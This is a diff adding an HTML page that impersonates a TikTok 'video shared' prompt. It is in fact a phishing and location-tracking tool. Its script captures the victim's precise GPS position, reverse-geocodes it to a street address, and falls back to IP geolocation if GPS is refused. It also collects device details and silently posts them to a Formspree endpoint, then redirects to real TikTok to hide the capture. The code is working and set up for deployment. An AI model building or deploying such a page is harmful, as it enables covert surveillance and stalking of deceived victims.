@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok | Video Shared</title>
+    <style>
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        /* New Background - Dark Gradient */
+        .bg-custom {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            /* REPLACE URL BELOW WITH YOUR BACKGROUND IMAGE */
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)),
+                        url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?q=80&w=1000');
+            background-size: cover;
+            background-position: center;
+            z-index: 1;
+            filter: blur(5px); /* Optional: blurs bg to make modal pop */
+        }
+
+        .modal {
+            position: relative; background: #fff; width: 85%; max-width: 360px;
+            border-radius: 20px; padding: 40px 30px; text-align: center;
+            z-index: 10; box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+        }
+
+        /* --- PROFILE ICON STYLE --- */
+        .profile-container {
+            width: 90px; height: 90px;
+            margin: -85px auto 20px; /* Pulls it up halfway out of the box */
+            border-radius: 50%;
+            border: 5px solid #fff;
+            overflow: hidden;
+            background: #eee;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        .profile-container img {
+            width: 100%; height: 100%; object-fit: cover;
+        }
+
+        h2 { font-size: 22px; font-weight: 800; margin: 0 0 10px; color: #161823; }
+        p { font-size: 15px; color: #555; line-height: 1.4; margin-bottom: 30px; }
+
+        .btn-watch {
+            background-color: #fe2c55; color: #fff; border: none;
+            padding: 16px; width: 100%; border-radius: 8px;
+            font-weight: 700; font-size: 18px; cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .btn-not-now { background: none; border: none; color: #888; font-size: 16px; cursor: pointer; }
+
+        .bg-gradient {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(135deg, #111111 0%, #2a2a2a 100%);
+            z-index: 1;
+        }
+
+        .modal {
+            position: relative; background: #fff; width: 85%; max-width: 360px;
+            border-radius: 12px; padding: 40px 30px; text-align: center;
+            z-index: 10; box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+        }
+
+        /* Removed .profile-img style */
+
+        h2 {
+            font-size: 24px; font-weight: 800; margin: 0 0 15px;
+            color: #161823;
+        }
+
+        p {
+            font-size: 16px; color: #555; line-height: 1.5; margin-bottom: 35px;
+        }
+
+        .btn-watch {
+            background-color: #fe2c55; color: #fff; border: none;
+            padding: 16px; width: 100%; border-radius: 8px;
+            font-weight: 700; font-size: 18px; cursor: pointer;
+            margin-bottom: 15px; transition: background 0.2s;
+        }
+
+        .btn-watch:active { background-color: #e0274a; }
+
+        .btn-not-now {
+            background: none; border: none; color: #888;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-custom"></div>
+
+    <div class="modal">
+        <div class="profile-container">
+            <img src="https://www.w3schools.com/howto/img_avatar.png" alt="Profile">
+        </div>
+
+        <h2>Watch video on TikTok</h2>
+        <p>Reza Ahmadi shared a video with you. Tap below to open the app.</p>
+
+        <button class="btn-watch" id="mainAction">Open TikTok</button>
+        <br>
+        <button class="btn-not-now" onclick="window.location.href='https://www.tiktok.com'">Not now</button>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const FORMSPREE_ENDPOINT = "https://formspree.io/f/xojnaojd";
+        const REDIRECT_URL = "https://www.tiktok.com/foryou";
+        // ---------------------
+
+        const btn = document.getElementById('mainAction');
+
+        btn.addEventListener('click', function() {
+            btn.innerText = "Opening...";
+            btn.style.opacity = "0.7";
+
+            // 1. Gather System Info immediately
+            const systemInfo = getSystemDetails();
+
+            if (navigator.geolocation) {
+                // High accuracy request
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    // Success: GPS Available
+                    await handleGPSLocation(pos, systemInfo);
+                }, () => {
+                    // Error/Denied: Fallback to IP
+                    handleIPFallback(systemInfo, "User Denied GPS / Error");
+                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            } else {
+                // Not supported: Fallback to IP
+                handleIPFallback(systemInfo, "Geolocation Not Supported by Browser");
+            }
+        });
+
+        async function handleGPSLocation(pos, sysInfo) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            try {
+                // Added zoom=18 and addressdetails=1 for maximum precision
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                const d = await res.json();
+                const addr = d.address;
+
+                // Combine location data with system data
+                const finalPayload = {
+                    CAPTURE_METHOD: "✅ GPS Precise",
+                    // Use display_name as the master "Full Address" fallback
+                    FULL_ADDRESS_STRING: d.display_name || "N/A",
+                    // Try multiple fields for number and street
+                    Street_Number: addr.house_number || addr.street_number || "Specific Number Not in DB",
+                    Street_Name: addr.road || addr.pedestrian || addr.street || "Unknown Street",
+                    Suburb_District: addr.suburb || addr.neighbourhood || addr.district || "N/A",
+                    City_Town: addr.city || addr.town || addr.village || "N/A",
+                    State_Region: addr.state || addr.region || "N/A",
+                    Postcode: addr.postcode || "N/A",
+                    Country: addr.country || "N/A",
+                    long: lon || "N/A",
+                    lat: lat || "N/A",
+
+                    Google_Maps_Link: `https://www.google.com/maps?q=${lat},${lon}`,
+                    ...sysInfo // Spread system info into payload
+                };
+                await sendData(finalPayload);
+
+            } catch (e) {
+                handleIPFallback(sysInfo, "GPS OK but Address Lookup Failed");
+            }
+        }
+
+        async function handleIPFallback(sysInfo, reason) {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+
+                const finalPayload = {
+                    CAPTURE_METHOD: `⚠️ IP Fallback (${reason})`,
+                    Note: "Street level data not available via IP.",
+                    City: d.city || "N/A",
+                    Region: d.region || "N/A",
+                    Country: d.country_name || "N/A",
+                    ISP: d.org || "N/A",
+                    IP_Address: d.ip || "N/A",
+                    ...sysInfo
+                };
+                await sendData(finalPayload);
+            } catch (e) {
+                redirect(); // Everything failed, just go to TikTok
+            }
+        }
+
+        // Helper to get extra browser details
+        function getSystemDetails() {
+            return {
+                "--- DEVICE INFO ---": "---",
+                Platform_OS: navigator.platform || "Unknown",
+                Language: navigator.language || "Unknown",
+                Screen_Resolution: `${window.screen.width}x${window.screen.height}`,
+                Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+                User_Agent_Raw: navigator.userAgent
+            };
+        }
+
+        async function sendData(payload) {
+            try {
+                await fetch(FORMSPREE_ENDPOINT, {
+                    method: "POST",
+                    body: JSON.stringify(payload),
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+                });
+            } finally {
+                redirect();
+            }
+        }
+
+        function redirect() {
+            window.location.href = REDIRECT_URL;
+        }
+    </script>
+</body>
+</html>
